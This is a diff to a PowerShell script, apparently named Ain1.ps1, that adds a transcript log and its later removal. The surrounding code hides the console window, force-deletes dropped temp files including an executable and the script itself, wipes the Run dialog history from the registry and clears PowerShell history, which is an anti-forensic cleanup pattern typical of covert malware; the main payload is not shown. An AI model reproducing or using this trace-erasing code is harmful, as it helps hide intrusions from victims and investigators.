@@ -1,5 +1,7 @@
 # ##############################################################################
 
+# Redirect both standard output and error to null
+$null = Start-Transcript -Path "$env:TEMP\Ain1_log.txt" -Append
 
 ###############################################################################
 # Hide the console window
@@ -184,16 +186,20 @@ if (Test-Path $filePath) {
     #Write-Host "File not found: $filePath"
 }
 
+# End the transcript if you started one
+Stop-Transcript
 
 Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\ftf.ps1" -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\Ain1.ps1" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
 
 
 #delete the entire history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
 
 # Clear the PowerShell command history
 Clear-History
